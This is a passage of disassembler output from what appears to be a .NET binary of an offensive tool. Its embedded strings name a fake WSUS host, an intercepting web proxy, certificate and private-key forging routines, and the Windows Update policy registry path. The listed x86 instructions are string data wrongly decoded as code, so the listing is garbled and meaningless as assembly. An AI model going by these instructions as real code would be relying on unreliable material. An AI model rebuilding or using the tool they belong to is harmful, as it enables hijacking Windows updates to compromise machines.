  4079d1:	65 66 66 69 63 69 65 	data16 imul $0x6e65,%gs:0x69(%ebx),%sp
  4079d8:	6e 
  4079d9:	74 00                	je     0x4079db
  4079db:	48                   	dec    %eax
  4079dc:	74 74                	je     0x407a52
  4079de:	70 57                	jo     0x407a37
  4079e0:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4079e4:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  4079eb:	74 5f                	je     0x407a4c
  4079ed:	48                   	dec    %eax
  4079ee:	74 74                	je     0x407a64
  4079f0:	70 43                	jo     0x407a35
  4079f2:	6c                   	insb   (%dx),%es:(%edi)
  4079f3:	69 65 6e 74 00 58 45 	imul   $0x45580074,0x6e(%ebp),%esp
  4079fa:	6c                   	insb   (%dx),%es:(%edi)
  4079fb:	65 6d                	gs insl (%dx),%es:(%edi)
  4079fd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4079ff:	74 00                	je     0x407a01
  407a01:	45                   	inc    %ebp
  407a02:	6e                   	outsb  %ds:(%esi),(%dx)
  407a03:	76 69                	jbe    0x407a6e
  407a05:	72 6f                	jb     0x407a76
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	6d                   	insl   (%dx),%es:(%edi)
  407a09:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a0b:	74 00                	je     0x407a0d
  407a0d:	58                   	pop    %eax
  407a0e:	44                   	inc    %esp
  407a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a10:	63 75 6d             	arpl   %esi,0x6d(%ebp)
  407a13:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a15:	74 00                	je     0x407a17
  407a17:	67 65 74 5f          	addr16 gs je 0x407a7a
  407a1b:	50                   	push   %eax
  407a1c:	75 62                	jne    0x407a80
  407a1e:	6c                   	insb   (%dx),%es:(%edi)
  407a1f:	69 63 45 78 70 6f 6e 	imul   $0x6e6f7078,0x45(%ebx),%esp
  407a26:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a28:	74 00                	je     0x407a2a
  407a2a:	67 65 74 5f          	addr16 gs je 0x407a8d
  407a2e:	50                   	push   %eax
  407a2f:	72 69                	jb     0x407a9a
  407a31:	76 61                	jbe    0x407a94
  407a33:	74 65                	je     0x407a9a
  407a35:	45                   	inc    %ebp
  407a36:	78 70                	js     0x407aa8
  407a38:	6f                   	outsl  %ds:(%esi),(%dx)
  407a39:	6e                   	outsb  %ds:(%esi),(%dx)
  407a3a:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a3c:	74 00                	je     0x407a3e
  407a3e:	67 65 74 5f          	addr16 gs je 0x407aa1
  407a42:	43                   	inc    %ebx
  407a43:	75 72                	jne    0x407ab7
  407a45:	72 65                	jb     0x407aac
  407a47:	6e                   	outsb  %ds:(%esi),(%dx)
  407a48:	74 00                	je     0x407a4a
  407a4a:	49                   	dec    %ecx
  407a4b:	50                   	push   %eax
  407a4c:	45                   	inc    %ebp
  407a4d:	6e                   	outsb  %ds:(%esi),(%dx)
  407a4e:	64 50                	fs push %eax
  407a50:	6f                   	outsl  %ds:(%esi),(%dx)
  407a51:	69 6e 74 00 41 64 64 	imul   $0x64644100,0x74(%esi),%ebp
  407a58:	45                   	inc    %ebp
  407a59:	6e                   	outsb  %ds:(%esi),(%dx)
  407a5a:	64 50                	fs push %eax
  407a5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a5d:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  407a64:	5f                   	pop    %edi
  407a65:	43                   	inc    %ebx
  407a66:	6c                   	insb   (%dx),%es:(%edi)
  407a67:	69 65 6e 74 4c 6f 63 	imul   $0x636f4c74,0x6e(%ebp),%esp
  407a6e:	61                   	popa
  407a6f:	6c                   	insb   (%dx),%es:(%edi)
  407a70:	45                   	inc    %ebp
  407a71:	6e                   	outsb  %ds:(%esi),(%dx)
  407a72:	64 50                	fs push %eax
  407a74:	6f                   	outsl  %ds:(%esi),(%dx)
  407a75:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  407a7c:	5f                   	pop    %edi
  407a7d:	55                   	push   %ebp
  407a7e:	70 53                	jo     0x407ad3
  407a80:	74 72                	je     0x407af4
  407a82:	65 61                	gs popa
  407a84:	6d                   	insl   (%dx),%es:(%edi)
  407a85:	45                   	inc    %ebp
  407a86:	6e                   	outsb  %ds:(%esi),(%dx)
  407a87:	64 50                	fs push %eax
  407a89:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8a:	69 6e 74 00 65 78 70 	imul   $0x70786500,0x74(%esi),%ebp
  407a91:	6c                   	insb   (%dx),%es:(%edi)
  407a92:	69 63 69 74 45 6e 64 	imul   $0x646e4574,0x69(%ebx),%esp
  407a99:	50                   	push   %eax
  407a9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a9b:	69 6e 74 00 45 78 70 	imul   $0x70784500,0x74(%esi),%ebp
  407aa2:	6c                   	insb   (%dx),%es:(%edi)
  407aa3:	69 63 69 74 50 72 6f 	imul   $0x6f725074,0x69(%ebx),%esp
  407aaa:	78 79                	js     0x407b25
  407aac:	45                   	inc    %ebp
  407aad:	6e                   	outsb  %ds:(%esi),(%dx)
  407aae:	64 50                	fs push %eax
  407ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ab1:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  407ab8:	5f                   	pop    %edi
  407ab9:	43                   	inc    %ebx
  407aba:	6f                   	outsl  %ds:(%esi),(%dx)
  407abb:	75 6e                	jne    0x407b2b
  407abd:	74 00                	je     0x407abf
  407abf:	67 65 74 5f          	addr16 gs je 0x407b22
  407ac3:	53                   	push   %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 43             	gs jb  0x407b0d
  407aca:	6f                   	outsl  %ds:(%esi),(%dx)
  407acb:	6e                   	outsb  %ds:(%esi),(%dx)
  407acc:	6e                   	outsb  %ds:(%esi),(%dx)
  407acd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407ad2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ad3:	43                   	inc    %ebx
  407ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ad5:	75 6e                	jne    0x407b45
  407ad7:	74 00                	je     0x407ad9
  407ad9:	67 65 74 5f          	addr16 gs je 0x407b3c
  407add:	43                   	inc    %ebx
  407ade:	6c                   	insb   (%dx),%es:(%edi)
  407adf:	69 65 6e 74 43 6f 6e 	imul   $0x6e6f4374,0x6e(%ebp),%esp
  407ae6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ae7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aec:	6e                   	outsb  %ds:(%esi),(%dx)
  407aed:	43                   	inc    %ebx
  407aee:	6f                   	outsl  %ds:(%esi),(%dx)
  407aef:	75 6e                	jne    0x407b5f
  407af1:	74 00                	je     0x407af3
  407af3:	53                   	push   %ebx
  407af4:	74 61                	je     0x407b57
  407af6:	72 74                	jb     0x407b6c
  407af8:	00 67 65             	add    %ah,0x65(%edi)
  407afb:	6e                   	outsb  %ds:(%esi),(%dx)
  407afc:	65 72 69             	gs jb  0x407b68
  407aff:	63 43 65             	arpl   %eax,0x65(%ebx)
  407b02:	72 74                	jb     0x407b78
  407b04:	00 63 65             	add    %ah,0x65(%ebx)
  407b07:	72 74                	jb     0x407b7d
  407b09:	00 72 65             	add    %dh,0x65(%edx)
  407b0c:	76 65                	jbe    0x407b73
  407b0e:	72 74                	jb     0x407b84
  407b10:	00 43 6f             	add    %al,0x6f(%ebx)
  407b13:	6e                   	outsb  %ds:(%esi),(%dx)
  407b14:	76 65                	jbe    0x407b7b
  407b16:	72 74                	jb     0x407b8c
  407b18:	00 67 65             	add    %ah,0x65(%edi)
  407b1b:	74 5f                	je     0x407b7c
  407b1d:	50                   	push   %eax
  407b1e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b1f:	72 74                	jb     0x407b95
  407b21:	00 6c 69 73          	add    %ch,0x73(%ecx,%ebp,2)
  407b25:	74 65                	je     0x407b8c
  407b27:	6e                   	outsb  %ds:(%esi),(%dx)
  407b28:	50                   	push   %eax
  407b29:	6f                   	outsl  %ds:(%esi),(%dx)
  407b2a:	72 74                	jb     0x407ba0
  407b2c:	00 70 6f             	add    %dh,0x6f(%eax)
  407b2f:	72 74                	jb     0x407ba5
  407b31:	00 67 65             	add    %ah,0x65(%edi)
  407b34:	74 5f                	je     0x407b95
  407b36:	52                   	push   %edx
  407b37:	65 71 75             	gs jno 0x407baf
  407b3a:	65 73 74             	gs jae 0x407bb1
  407b3d:	00 61 64             	add    %ah,0x64(%ecx)
  407b40:	64 5f                	fs pop %edi
  407b42:	42                   	inc    %edx
  407b43:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  407b46:	72 65                	jb     0x407bad
  407b48:	52                   	push   %edx
  407b49:	65 71 75             	gs jno 0x407bc1
  407b4c:	65 73 74             	gs jae 0x407bc3
  407b4f:	00 72 65             	add    %dh,0x65(%edx)
  407b52:	6d                   	insl   (%dx),%es:(%edi)
  407b53:	6f                   	outsl  %ds:(%esi),(%dx)
  407b54:	76 65                	jbe    0x407bbb
  407b56:	5f                   	pop    %edi
  407b57:	42                   	inc    %edx
  407b58:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  407b5b:	72 65                	jb     0x407bc2
  407b5d:	52                   	push   %edx
  407b5e:	65 71 75             	gs jno 0x407bd6
  407b61:	65 73 74             	gs jae 0x407bd8
  407b64:	00 6f 6e             	add    %ch,0x6e(%edi)
  407b67:	52                   	push   %edx
  407b68:	65 71 75             	gs jno 0x407be0
  407b6b:	65 73 74             	gs jae 0x407be2
  407b6e:	00 48 74             	add    %cl,0x74(%eax)
  407b71:	74 70                	je     0x407be3
  407b73:	4c                   	dec    %esp
  407b74:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  407b7b:	52                   	push   %edx
  407b7c:	65 71 75             	gs jno 0x407bf4
  407b7f:	65 73 74             	gs jae 0x407bf6
  407b82:	00 61 64             	add    %ah,0x64(%ecx)
  407b85:	64 5f                	fs pop %edi
  407b87:	42                   	inc    %edx
  407b88:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  407b8b:	72 65                	jb     0x407bf2
  407b8d:	54                   	push   %esp
  407b8e:	75 6e                	jne    0x407bfe
  407b90:	6e                   	outsb  %ds:(%esi),(%dx)
  407b91:	65 6c                	gs insb (%dx),%es:(%edi)
  407b93:	43                   	inc    %ebx
  407b94:	6f                   	outsl  %ds:(%esi),(%dx)
  407b95:	6e                   	outsb  %ds:(%esi),(%dx)
  407b96:	6e                   	outsb  %ds:(%esi),(%dx)
  407b97:	65 63 74 52 65       	arpl   %esi,%gs:0x65(%edx,%edx,2)
  407b9c:	71 75                	jno    0x407c13
  407b9e:	65 73 74             	gs jae 0x407c15
  407ba1:	00 72 65             	add    %dh,0x65(%edx)
  407ba4:	6d                   	insl   (%dx),%es:(%edi)
  407ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ba6:	76 65                	jbe    0x407c0d
  407ba8:	5f                   	pop    %edi
  407ba9:	42                   	inc    %edx
  407baa:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  407bad:	72 65                	jb     0x407c14
  407baf:	54                   	push   %esp
  407bb0:	75 6e                	jne    0x407c20
  407bb2:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb3:	65 6c                	gs insb (%dx),%es:(%edi)
  407bb5:	43                   	inc    %ebx
  407bb6:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb7:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb9:	65 63 74 52 65       	arpl   %esi,%gs:0x65(%edx,%edx,2)
  407bbe:	71 75                	jno    0x407c35
  407bc0:	65 73 74             	gs jae 0x407c37
  407bc3:	00 6f 6e             	add    %ch,0x6e(%edi)
  407bc6:	42                   	inc    %edx
  407bc7:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  407bca:	72 65                	jb     0x407c31
  407bcc:	54                   	push   %esp
  407bcd:	75 6e                	jne    0x407c3d
  407bcf:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd0:	65 6c                	gs insb (%dx),%es:(%edi)
  407bd2:	43                   	inc    %ebx
  407bd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd6:	65 63 74 52 65       	arpl   %esi,%gs:0x65(%edx,%edx,2)
  407bdb:	71 75                	jno    0x407c52
  407bdd:	65 73 74             	gs jae 0x407c54
  407be0:	00 66 61             	add    %ah,0x61(%esi)
  407be3:	6b 65 57 53          	imul   $0x53,0x57(%ebp),%esp
  407be7:	55                   	push   %ebp
  407be8:	53                   	push   %ebx
  407be9:	48                   	dec    %eax
  407bea:	6f                   	outsl  %ds:(%esi),(%dx)
  407beb:	73 74                	jae    0x407c61
  407bed:	00 67 65             	add    %ah,0x65(%edi)
  407bf0:	74 5f                	je     0x407c51
  407bf2:	48                   	dec    %eax
  407bf3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bf4:	73 74                	jae    0x407c6a
  407bf6:	00 77 73             	add    %dh,0x73(%edi)
  407bf9:	75 73                	jne    0x407c6e
  407bfb:	48                   	dec    %eax
  407bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfd:	73 74                	jae    0x407c73
  407bff:	00 70 72             	add    %dh,0x72(%eax)
  407c02:	6f                   	outsl  %ds:(%esi),(%dx)
  407c03:	78 79                	js     0x407c7e
  407c05:	68 6f 73 74 00       	push   $0x74736f
  407c0a:	41                   	inc    %ecx
  407c0b:	64 64 46             	fs fs inc %esi
  407c0e:	69 72 73 74 00 4d 6f 	imul   $0x6f4d0074,0x73(%edx),%esi
  407c15:	76 65                	jbe    0x407c7c
  407c17:	4e                   	dec    %esi
  407c18:	65 78 74             	gs js  0x407c8f
  407c1b:	00 53 79             	add    %dl,0x79(%ebx)
  407c1e:	73 74                	jae    0x407c94
  407c20:	65 6d                	gs insl (%dx),%es:(%edi)
  407c22:	2e 54                	cs push %esp
  407c24:	65 78 74             	gs js  0x407c9b
  407c27:	00 48 74             	add    %cl,0x74(%eax)
  407c2a:	74 70                	je     0x407c9c
  407c2c:	4c                   	dec    %esp
  407c2d:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  407c34:	43                   	inc    %ebx
  407c35:	6f                   	outsl  %ds:(%esi),(%dx)
  407c36:	6e                   	outsb  %ds:(%esi),(%dx)
  407c37:	74 65                	je     0x407c9e
  407c39:	78 74                	js     0x407caf
  407c3b:	00 67 65             	add    %ah,0x65(%edi)
  407c3e:	74 5f                	je     0x407c9f
  407c40:	55                   	push   %ebp
  407c41:	74 63                	je     0x407ca6
  407c43:	4e                   	dec    %esi
  407c44:	6f                   	outsl  %ds:(%esi),(%dx)
  407c45:	77 00                	ja     0x407c47
  407c47:	52                   	push   %edx
  407c48:	65 67 65 78 00       	gs addr16 gs js 0x407c4d
  407c4d:	46                   	inc    %esi
  407c4e:	72 6f                	jb     0x407cbf
  407c50:	6d                   	insl   (%dx),%es:(%edi)
  407c51:	42                   	inc    %edx
  407c52:	79 74                	jns    0x407cc8
  407c54:	65 41                	gs inc %ecx
  407c56:	72 72                	jb     0x407cca
  407c58:	61                   	popa
  407c59:	79 00                	jns    0x407c5b
  407c5b:	54                   	push   %esp
  407c5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5d:	41                   	inc    %ecx
  407c5e:	72 72                	jb     0x407cd2
  407c60:	61                   	popa
  407c61:	79 00                	jns    0x407c63
  407c63:	54                   	push   %esp
  407c64:	6f                   	outsl  %ds:(%esi),(%dx)
  407c65:	43                   	inc    %ebx
  407c66:	68 61 72 41 72       	push   $0x72417261
  407c6b:	72 61                	jb     0x407cce
  407c6d:	79 00                	jns    0x407c6f
  407c6f:	73 65                	jae    0x407cd6
  407c71:	74 5f                	je     0x407cd2
  407c73:	46                   	inc    %esi
  407c74:	6f                   	outsl  %ds:(%esi),(%dx)
  407c75:	72 77                	jb     0x407cee
  407c77:	61                   	popa
  407c78:	72 64                	jb     0x407cde
  407c7a:	54                   	push   %esp
  407c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c7c:	55                   	push   %ebp
  407c7d:	70 73                	jo     0x407cf2
  407c7f:	74 72                	je     0x407cf3
  407c81:	65 61                	gs popa
  407c83:	6d                   	insl   (%dx),%es:(%edi)
  407c84:	47                   	inc    %edi
  407c85:	61                   	popa
  407c86:	74 65                	je     0x407ced
  407c88:	77 61                	ja     0x407ceb
  407c8a:	79 00                	jns    0x407c8c
  407c8c:	47                   	inc    %edi
  407c8d:	65 74 52             	gs je  0x407ce2
  407c90:	65 73 70             	gs jae 0x407d03
  407c93:	6f                   	outsl  %ds:(%esi),(%dx)
  407c94:	6e                   	outsb  %ds:(%esi),(%dx)
  407c95:	73 65                	jae    0x407cfc
  407c97:	42                   	inc    %edx
  407c98:	6f                   	outsl  %ds:(%esi),(%dx)
  407c99:	64 79 00             	fs jns 0x407c9c
  407c9c:	67 65 74 5f          	addr16 gs je 0x407cff
  407ca0:	48                   	dec    %eax
  407ca1:	61                   	popa
  407ca2:	73 42                	jae    0x407ce6
  407ca4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ca5:	64 79 00             	fs jns 0x407ca8
  407ca8:	53                   	push   %ebx
  407ca9:	65 74 50             	gs je  0x407cfc
  407cac:	75 62                	jne    0x407d10
  407cae:	6c                   	insb   (%dx),%es:(%edi)
  407caf:	69 63 4b 65 79 00 50 	imul   $0x50007965,0x4b(%ebx),%esp
  407cb6:	61                   	popa
  407cb7:	72 73                	jb     0x407d2c
  407cb9:	65 50                	gs push %eax
  407cbb:	72 69                	jb     0x407d26
  407cbd:	76 61                	jbe    0x407d20
  407cbf:	74 65                	je     0x407d26
  407cc1:	4b                   	dec    %ebx
  407cc2:	65 79 00             	gs jns 0x407cc5
  407cc5:	77 69                	ja     0x407d30
  407cc7:	74 68                	je     0x407d31
  407cc9:	50                   	push   %eax
  407cca:	72 69                	jb     0x407d35
  407ccc:	76 61                	jbe    0x407d2f
  407cce:	74 65                	je     0x407d35
  407cd0:	4b                   	dec    %ebx
  407cd1:	65 79 00             	gs jns 0x407cd4
  407cd4:	69 73 73 75 65 72 50 	imul   $0x50726575,0x73(%ebx),%esi
  407cdb:	72 69                	jb     0x407d46
  407cdd:	76 61                	jbe    0x407d40
  407cdf:	74 65                	je     0x407d46
  407ce1:	4b                   	dec    %ebx
  407ce2:	65 79 00             	gs jns 0x407ce5
  407ce5:	70 72                	jo     0x407d59
  407ce7:	69 76 61 74 65 4b 65 	imul   $0x654b6574,0x61(%esi),%esi
  407cee:	79 00                	jns    0x407cf0
  407cf0:	43                   	inc    %ebx
  407cf1:	6f                   	outsl  %ds:(%esi),(%dx)
  407cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf3:	74 61                	je     0x407d56
  407cf5:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  407cfc:	53                   	push   %ebx
  407cfd:	79 73                	jns    0x407d72
  407cff:	74 65                	je     0x407d66
  407d01:	6d                   	insl   (%dx),%es:(%edi)
  407d02:	2e 53                	cs push %ebx
  407d04:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407d08:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  407d0f:	70 
  407d10:	74 6f                	je     0x407d81
  407d12:	67 72 61             	addr16 jb 0x407d76
  407d15:	70 68                	jo     0x407d7f
  407d17:	79 00                	jns    0x407d19
  407d19:	41                   	inc    %ecx
  407d1a:	73 6e                	jae    0x407d8a
  407d1c:	31 53 69             	xor    %edx,0x69(%ebx)
  407d1f:	67 6e                	outsb  %ds:(%si),(%dx)
  407d21:	61                   	popa
  407d22:	74 75                	je     0x407d99
  407d24:	72 65                	jb     0x407d8b
  407d26:	46                   	inc    %esi
  407d27:	61                   	popa
  407d28:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407d2c:	79 00                	jns    0x407d2e
  407d2e:	49                   	dec    %ecx
  407d2f:	53                   	push   %ebx
  407d30:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  407d37:	65 46                	gs inc %esi
  407d39:	61                   	popa
  407d3a:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407d3e:	79 00                	jns    0x407d40
  407d40:	50                   	push   %eax
  407d41:	72 69                	jb     0x407dac
  407d43:	76 61                	jbe    0x407da6
  407d45:	74 65                	je     0x407dac
  407d47:	4b                   	dec    %ebx
  407d48:	65 79 49             	gs jns 0x407d94
  407d4b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d4c:	66 6f                	outsw  %ds:(%esi),(%dx)
  407d4e:	46                   	inc    %esi
  407d4f:	61                   	popa
  407d50:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407d54:	79 00                	jns    0x407d56
  407d56:	58                   	pop    %eax
  407d57:	35 30 39 43 65       	xor    $0x65433930,%eax
  407d5c:	72 74                	jb     0x407dd2
  407d5e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d65:	45                   	inc    %ebp
  407d66:	6e                   	outsb  %ds:(%esi),(%dx)
  407d67:	74 72                	je     0x407ddb
  407d69:	79 00                	jns    0x407d6b
  407d6b:	53                   	push   %ebx
  407d6c:	65 74 43             	gs je  0x407db2
  407d6f:	65 72 74             	gs jb  0x407de6
  407d72:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d79:	45                   	inc    %ebp
  407d7a:	6e                   	outsb  %ds:(%esi),(%dx)
  407d7b:	74 72                	je     0x407def
  407d7d:	79 00                	jns    0x407d7f
  407d7f:	41                   	inc    %ecx
  407d80:	73 79                	jae    0x407dfb
  407d82:	6d                   	insl   (%dx),%es:(%edi)
  407d83:	6d                   	insl   (%dx),%es:(%edi)
  407d84:	65 74 72             	gs je  0x407df9
  407d87:	69 63 4b 65 79 45 6e 	imul   $0x6e457965,0x4b(%ebx),%esp
  407d8e:	74 72                	je     0x407e02
  407d90:	79 00                	jns    0x407d92
  407d92:	53                   	push   %ebx
  407d93:	65 74 4b             	gs je  0x407de1
  407d96:	65 79 45             	gs jns 0x407dde
  407d99:	6e                   	outsb  %ds:(%esi),(%dx)
  407d9a:	74 72                	je     0x407e0e
  407d9c:	79 00                	jns    0x407d9e
  407d9e:	52                   	push   %edx
  407d9f:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  407da6:	00 6f 
  407da8:	70 5f                	jo     0x407e09
  407daa:	45                   	inc    %ebp
  407dab:	71 75                	jno    0x407e22
  407dad:	61                   	popa
  407dae:	6c                   	insb   (%dx),%es:(%edi)
  407daf:	69 74 79 00 57 53 75 	imul   $0x73755357,0x0(%ecx,%edi,2),%esi
  407db6:	73 
  407db7:	70 69                	jo     0x407e22
  407db9:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  407dbc:	75 73                	jne    0x407e31
  407dbe:	2e 55                	cs push %ebp
  407dc0:	74 69                	je     0x407e2b
  407dc2:	6c                   	insb   (%dx),%es:(%edi)
  407dc3:	69 74 79 00 57 65 62 	imul   $0x55626557,0x0(%ecx,%edi,2),%esi
  407dca:	55 
  407dcb:	74 69                	je     0x407e36
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	69 74 79 00 4f 72 67 	imul   $0x2e67724f,0x0(%ecx,%edi,2),%esi
  407dd5:	2e 
  407dd6:	42                   	inc    %edx
  407dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd8:	75 6e                	jne    0x407e48
  407dda:	63 79 43             	arpl   %edi,0x43(%ecx)
  407ddd:	61                   	popa
  407dde:	73 74                	jae    0x407e54
  407de0:	6c                   	insb   (%dx),%es:(%edi)
  407de1:	65 2e 53             	gs cs push %ebx
  407de4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407de8:	69 74 79 00 49 73 4e 	imul   $0x754e7349,0x0(%ecx,%edi,2),%esi
  407def:	75 
  407df0:	6c                   	insb   (%dx),%es:(%edi)
  407df1:	6c                   	insb   (%dx),%es:(%edi)
  407df2:	4f                   	dec    %edi
  407df3:	72 45                	jb     0x407e3a
  407df5:	6d                   	insl   (%dx),%es:(%edi)
  407df6:	70 74                	jo     0x407e6c
  407df8:	79 00                	jns    0x407dfa
  407dfa:	54                   	push   %esp
  407dfb:	69 74 61 6e 69 75 6d 	imul   $0x2e6d7569,0x6e(%ecx,%eiz,2),%esi
  407e02:	2e 
  407e03:	57                   	push   %edi
  407e04:	65 62 2e             	bound  %ebp,%gs:(%esi)
  407e07:	50                   	push   %eax
  407e08:	72 6f                	jb     0x407e79
  407e0a:	78 79                	js     0x407e85
  407e0c:	00 57 53             	add    %dl,0x53(%edi)
  407e0f:	75 73                	jne    0x407e84
  407e11:	70 69                	jo     0x407e7c
  407e13:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  407e16:	75 73                	jne    0x407e8b
  407e18:	2e 53                	cs push %ebx
  407e1a:	65 72 76             	gs jb  0x407e93
  407e1d:	65 72 73             	gs jb  0x407e93
  407e20:	2e 50                	cs push %eax
  407e22:	72 6f                	jb     0x407e93
  407e24:	78 79                	js     0x407e9f
  407e26:	00 57 73             	add    %dl,0x73(%edi)
  407e29:	75 73                	jne    0x407e9e
  407e2b:	50                   	push   %eax
  407e2c:	72 6f                	jb     0x407e9d
  407e2e:	78 79                	js     0x407ea9
  407e30:	00 73 65             	add    %dh,0x65(%ebx)
  407e33:	74 50                	je     0x407e85
  407e35:	72 6f                	jb     0x407ea6
  407e37:	78 79                	js     0x407eb2
  407e39:	00 00                	add    %al,(%eax)
  407e3b:	00 00                	add    %al,(%eax)
  407e3d:	0b 2f                	or     (%edi),%ebp
  407e3f:	00 68 00             	add    %ch,0x0(%eax)
  407e42:	65 00 6c 00 70       	add    %ch,%gs:0x70(%eax,%eax,1)
  407e47:	00 00                	add    %al,(%eax)
  407e49:	80 8b 48 00 4b 00 45 	orb    $0x45,0x4b0048(%ebx)
  407e50:	00 59 00             	add    %bl,0x0(%ecx)
  407e53:	5f                   	pop    %edi
  407e54:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  407e58:	00 43 00             	add    %al,0x0(%ebx)
  407e5b:	41                   	inc    %ecx
  407e5c:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  407e60:	00 4d 00             	add    %cl,0x0(%ebp)
  407e63:	41                   	inc    %ecx
  407e64:	00 43 00             	add    %al,0x0(%ebx)
  407e67:	48                   	dec    %eax
  407e68:	00 49 00             	add    %cl,0x0(%ecx)
  407e6b:	4e                   	dec    %esi
  407e6c:	00 45 00             	add    %al,0x0(%ebp)
  407e6f:	5c                   	pop    %esp
  407e70:	00 53 00             	add    %dl,0x0(%ebx)
  407e73:	4f                   	dec    %edi
  407e74:	00 46 00             	add    %al,0x0(%esi)
  407e77:	54                   	push   %esp
  407e78:	00 57 00             	add    %dl,0x0(%edi)
  407e7b:	41                   	inc    %ecx
  407e7c:	00 52 00             	add    %dl,0x0(%edx)
  407e7f:	45                   	inc    %ebp
  407e80:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  407e84:	00 6f 00             	add    %ch,0x0(%edi)
  407e87:	6c                   	insb   (%dx),%es:(%edi)
  407e88:	00 69 00             	add    %ch,0x0(%ecx)
  407e8b:	63 00                	arpl   %eax,(%eax)
  407e8d:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407e93:	5c                   	pop    %esp
  407e94:	00 4d 00             	add    %cl,0x0(%ebp)
  407e97:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407e9d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9e:	00 73 00             	add    %dh,0x0(%ebx)
  407ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea2:	00 66 00             	add    %ah,0x0(%esi)
  407ea5:	74 00                	je     0x407ea7
  407ea7:	5c                   	pop    %esp
  407ea8:	00 57 00             	add    %dl,0x0(%edi)
  407eab:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407eb1:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb2:	00 77 00             	add    %dh,0x0(%edi)
  407eb5:	73 00                	jae    0x407eb7
  407eb7:	5c                   	pop    %esp
  407eb8:	00 57 00             	add    %dl,0x0(%edi)
  407ebb:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407ec1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec2:	00 77 00             	add    %dh,0x0(%edi)
  407ec5:	73 00                	jae    0x407ec7
  407ec7:	55                   	push   %ebp
  407ec8:	00 70 00             	add    %dh,0x0(%eax)
  407ecb:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407ecf:	74 00                	je     0x407ed1
  407ed1:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  407ed6:	11 57 00             	adc    %edx,0x0(%edi)
  407ed9:	55                   	push   %ebp
  407eda:	00 53 00             	add    %dl,0x0(%ebx)
  407edd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407ee1:	76 00                	jbe    0x407ee3
  407ee3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407ee7:	00 0b                	add    %cl,(%ebx)
